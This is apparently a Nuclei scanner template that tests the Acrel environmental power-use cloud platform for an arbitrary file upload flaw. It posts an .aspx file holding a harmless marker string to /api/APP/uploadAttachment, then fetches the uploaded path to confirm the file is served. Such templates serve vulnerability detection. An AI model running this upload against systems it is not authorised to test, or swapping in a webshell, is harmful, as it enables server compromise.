id: ankerui-uploadAttachment-upload

info:
  name: 安科瑞环保用电监管云平台 uploadAttachment任意文件上漏洞
  author: ankerui
  severity: high
  tags: ankerui

http:
  - raw:
      - |
        POST /api/APP/uploadAttachment HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Content-Type: application/json
        Accept: */*
        Connection: close

        {"FileStr":"U3RybVJlYWRl","FileFormat":"aspx"}

      - |+
        GET {{paths}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate

    extractors:
      - type: regex
        part: body
        name: paths
        regex:
          - '"path":"(.*?\.aspx)"'
        internal: true
        group: 1

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body_2
        words:
          - 'StrmReade'
    matchers-condition: and
